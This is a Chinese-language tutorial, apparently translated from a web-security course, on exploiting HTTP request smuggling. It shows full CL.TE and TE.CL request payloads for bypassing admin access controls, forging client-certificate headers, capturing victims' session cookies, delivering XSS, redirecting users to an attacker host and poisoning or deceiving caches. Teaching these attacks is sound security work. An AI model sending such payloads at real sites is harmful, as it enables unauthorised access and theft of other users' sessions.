# 利用 HTTP 请求走私漏洞

在本节中，我们将根据应用程序的预期功能和其他行为，描述利用 HTTP 请求走私漏洞的各种方式。

## 使用 HTTP 请求走私绕过前端安全控制

在某些应用程序中，前端 Web 服务器用于实施一些安全控制，决定是否允许处理单个请求。允许的请求被转发到后端服务器，在那里它们被视为已通过前端控制。

例如，假设一个应用程序使用前端服务器实施访问控制限制，仅当用户被授权访问所请求的 URL 时才转发请求。后端服务器则照单全收，不再进行进一步检查。在这种情况下，HTTP 请求走私漏洞可用于通过向受限 URL 走私请求来绕过访问控制。

假设当前用户被允许访问 `/home` 但不允许访问 `/admin`。他们可以使用以下服务器视角的请求走私攻击绕过此限制：

**CL.TE**

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 2

xGET /home HTTP/1.1
Host: vulnerable-website.com
```
- 应对重复头部的异常（两个 Host）
    - 将普通请求移动到走私请求体中（限制最小），虽然后端优先 TE，但走私请求中仅提供 CL 于是并不会被忽略
    - 使用 “HTTP Host 头攻击”主题的覆盖头部或完整请求行 URL（需额外 Host 头攻击）
    - 若目标为相同 Host 则可移除走私的 Host（无法进行 Host 头操控）

前端服务器收到的攻击请求与普通请求，都是针对 `/home` 的，因此请求被转发到后端服务器。然而，后端服务器看到一个针对 `/home` 的请求和一个针对 `/admin` 的请求。它（一如既往地）假设这些请求已通过前端控制，因此授予对受限 URL 的访问权限。

**TE.CL**

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

6f
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0

GET /home HTTP/1.1
Host: vulnerable-website.com
```
- TE.CL 型天然将后续的普通请求放入被走私请求体

## 揭示前端请求重写 —— 提取前后端服务器通信头部

在许多应用程序中，前端服务器在将请求转发到后端服务器之前会对请求进行一些重写，通常是通过添加一些额外的请求头。例如，前端服务器可能：

- 终止 TLS 连接并添加一些描述所用协议和加密套件的头；
- 添加包含用户 IP 地址的 `X-Forwarded-For` 头；
- 基于会话令牌确定用户 ID 并添加标识用户的头；
- 添加对其他攻击有用的敏感信息。

在某些情况下，如果您的走私请求缺少通常由前端服务器添加的某些头，则后端服务器可能不会以正常方式处理请求，导致走私请求无法达到预期效果。

通常有一种简单的方法可以揭示前端服务器究竟如何重写请求。为此，您需要执行以下步骤：

1. 找到一个将请求参数值**反射**到应用程序响应中的 POST 请求，作为被走私的请求头部（也可使用存储型功能）。
2. 重新排列参数，使被反射的参数出现在消息体的最后。
3. 将此请求走私到后端服务器，紧接着发送一个正常的请求，此时反射参数即为前端重写后的下一个请求头部。

假设一个应用程序有一个登录功能，反射 `email` 参数的值：

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

这会产生一个包含以下内容的响应：

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

在这里，您可以使用以下请求走私攻击来揭示前端服务器执行的重写：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

请求将被前端服务器重写以包含额外的头，然后后端服务器将处理走私的请求，并将重写后的第二个请求视为 `email` 参数的值。然后，它会在对第二个请求的响应中反射此值：

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

> **注意：** 由于最终请求被重写，您不知道它最终会有多长。走私请求中 `Content-Length` 头的值将决定后端服务器认为请求有多长。如果将此值设置得太短，您将只收到部分重写后的请求；如果设置得太长，后端服务器将在等待请求完成时超时。当然，解决方案是猜测一个比提交的请求稍大的初始值，然后逐渐增加该值以检索更多信息，直到获得所有感兴趣的内容。

一旦您揭示了前端服务器如何重写请求，您就可以对走私的请求应用必要的重写，以确保它们被后端服务器以预期方式处理。

## 绕过客户端身份验证 —— 提取前后端服务器通信头部

作为 TLS 握手的一部分，服务器通过提供证书向客户端（通常是浏览器）进行身份验证。此证书包含其“通用名称”（CN），该名称应与其注册的主机名匹配。然后，客户端可以使用此信息来验证他们正在与属于预期域的合法服务器通信。

某些站点更进一步，实现了一种双向 TLS 身份验证，客户端也必须向服务器出示证书。在这种情况下，客户端的 CN 通常是用户名或类似信息，可在后端应用程序逻辑中用作访问控制机制的一部分。

负责验证客户端的组件通常通过一个或多个非标准 HTTP 头将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会向任何传入请求附加一个包含客户端 CN 的头：

```http
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

由于这些头应该完全对用户隐藏，它们通常被后端服务器隐式信任。假设您能够发送正确的头和值组合，这可能使您能够绕过访问控制。

在实践中，这种行为通常不可利用，因为前端服务器倾向于在头已存在时覆盖它们。然而，走私的请求完全对前端隐藏，因此它们包含的任何头都将原样发送到后端。

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

## 捕获其他用户的请求 —— 提取其他用户信息

如果应用程序包含任何允许您存储并随后检索文本数据的功能，您可以利用此功能捕获其他用户请求的内容。这些内容可能包括会话令牌或其他用户提交的敏感数据。适合作为此攻击载体的功能包括评论、电子邮件、个人资料描述、屏幕名称等。

要执行此攻击，您需要走私一个向**存储功能**提交数据的请求，并将包含要存储的数据的参数放在请求的最后（此处无法使用之前的反射型功能）。例如，假设一个应用程序使用以下请求提交博客文章评论，该评论将被存储并显示在博客上：

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

现在考虑如果您走私一个等效的请求，其中包含过长的 `Content-Length` 头，并将 `comment` 参数放在请求的最后，会发生什么：

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

走私请求的 `Content-Length` 头表明消息体将为 400 字节长，但我们只发送了 144 字节。在这种情况下，后端服务器将在发出响应之前等待剩余的 256 字节，如果这些字节没有足够快地到达，则会超时。因此，当另一个请求通过同一连接发送到后端服务器时，前 256 字节实际上被附加到走私请求中，如下所示：

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

由于受害者请求的开头包含在 `comment` 参数中，这将被作为评论发布在博客上，使您只需访问相关帖子即可阅读它。

要捕获更多受害者请求的内容，您只需相应增加走私请求的 `Content-Length` 头的值，但请注意这需要一定的反复试验。如果遇到超时，这可能意味着您指定的 `Content-Length` 高于受害者请求的实际长度。在这种情况下，只需减小该值直到攻击再次生效。

> **注意：** 此技术的一个限制是它通常只捕获数据直到走私请求适用的参数分隔符。对于 URL 编码的表单提交，这将是 `&` 字符，意味着从受害者用户请求中存储的内容将在第一个 `&` 处结束，这可能甚至出现在查询字符串中。

## 使用 HTTP 请求走私利用反射型 XSS —— 返回被攻破的脆弱页面执行载荷

如果应用程序容易受到 HTTP 请求走私的攻击，并且还包含反射型 XSS，您可以使用请求走私攻击来攻击应用程序的其他用户。这种方法在两个方面优于普通的反射型 XSS 利用：

- 它不需要与受害用户交互。您无需向用户提供 URL 并等待他们访问。您只需走私一个包含 XSS 载荷的请求，后端服务器处理的下一个用户请求就会被命中。
- 它可用于利用普通反射型 XSS 攻击中无法轻易控制的请求部分中的 XSS 行为，例如 HTTP 请求头。

例如，假设一个应用程序在 `User-Agent` 头中存在反射型 XSS 漏洞。您可以在请求走私攻击中如下利用它：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /page HTTP/1.1
User-Agent: <script>alert(1)</script>
Host: vulnerable-website.com
Content-Length: 2

x
```

下一个用户的请求将被附加到走私的请求中，他们将收到响应中反射的 XSS 载荷。

## 使用 HTTP 请求走私将站点内重定向转为开放重定向 —— 返回任意页面或替换请求资源

许多应用程序执行从一个 URL 到另一个 URL 的站点内重定向，并将请求的 `Host` 头中的主机名放入重定向 URL（动态构建重定向）。Apache 和 IIS Web 服务器的默认行为就是这样一个例子，其中对没有尾部斜杠的文件夹的请求会收到一个包含尾部斜杠的同一文件夹的重定向：

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

这种行为通常被认为无害，但可以在请求走私攻击中被利用，将其他用户重定向到外部域。例如：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：

```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
GET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

在这里，用户的请求是针对网站页面导入的 JavaScript 文件。攻击者可以通过在响应中返回自己的 JavaScript 来完全控制受害用户。

### 将根相对重定向转为开放重定向

在某些情况下，您可能会遇到使用路径为 `Location` 头构造根相对 URL 的服务器级重定向，例如：

```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

如果服务器允许您在路径中使用协议相对 URL，这仍可能被用于开放重定向：

```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

## 使用 HTTP 请求走私执行 Web 缓存投毒

在前述攻击的一个变体中，可能可以利用 HTTP 请求走私执行 Web 缓存投毒攻击。如果前端基础设施的任何部分执行内容缓存（通常出于性能原因），则可能可以用站外重定向响应投毒缓存。这将使攻击持久化，影响随后请求受影响 URL 的任何用户。

在此变体中，攻击者向前端服务器发送以下直到 `Foo: X` 的所有内容：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 75
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Content-Length: 2

xGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

走私的请求到达后端服务器，后端服务器以被污染的动态重定向响应。前端服务器将被污染的后端重定向响应缓存到它认为是第二个请求的 URL 上，即 `/static/include.js`：

```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

从此以后，当其他用户请求此 URL 时，他们会收到重定向到攻击者网站。

此处在攻击请求之后立即发送缓存投毒目标请求，以实现对特定资源缓存的投毒

- 虽然服务器端的确成功返回预期的重定向，然而此处的格式天然被规范与浏览器阻止
- 当存在 Host 头反射时，请求走私已可任意设置后端使用的 Host 头，而无需进行针对前后端解析差异的 Host 头攻击。
- 若使用 Host 头攻击实现此处的开放重定向，应当尝试除此之外的各种混淆方法，最终重定向 URL 中不可包含用户凭据

## 使用 HTTP 请求走私执行 Web 缓存欺骗

在攻击的又一个变体中，您可以利用 HTTP 请求走私执行 Web 缓存欺骗。其工作方式与 Web 缓存投毒攻击类似，但目的不同（即，走私内容为攻击者载荷以攻击其他用户，或走私内容为其他用户的请求以窃取信息）。

> **Web 缓存投毒与 Web 缓存欺骗有什么区别？**
>
> - 在 **Web 缓存投毒**中，攻击者导致应用程序在缓存中存储一些恶意内容，这些内容从缓存中提供给其他应用程序用户。
> - 在 **Web 缓存欺骗**中，攻击者导致应用程序在缓存中存储属于其他用户的敏感内容，然后攻击者从缓存中检索这些内容。

在此变体中，攻击者走私一个返回某些敏感用户特定内容的请求。例如：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

另一个用户转发到后端服务器的下一个请求将被附加到走私的请求中，包括会话 Cookie 和其他头。例如：

```http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

后端服务器以正常方式响应该请求。请求中的 URL 是用户的私人消息，并且请求在受害用户会话的上下文中被处理。前端服务器将此响应缓存到它认为是第二个请求的 URL 上，即 `/static/some-image.png`：

```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

然后攻击者访问该静态 URL 并从缓存中接收返回的敏感内容。

这里的一个重要警告是，攻击者不知道敏感内容将被缓存在哪个 URL 下，因为这将是走私请求生效时受害用户恰好请求的任何 URL。攻击者可能需要获取大量静态 URL 以发现捕获的内容。

简述：攻击者在走私头部设置敏感信息端点（如账户信息页面），之后当受害者发送请求时，受害者的会话头部被附加到走私头部从而成功访问并由后端返回存有敏感信息的端点。而受害者发送的请求若为可被缓存内容，则将被前端缓存到对应（攻击者未知）的资源中。攻击者浏览应用程序，并查看可被缓存的内容作为攻击后的潜在信息窃取端点。选择几个可能被加载的资源监视，或在受害者预期访问的端点加载所有内容并过滤
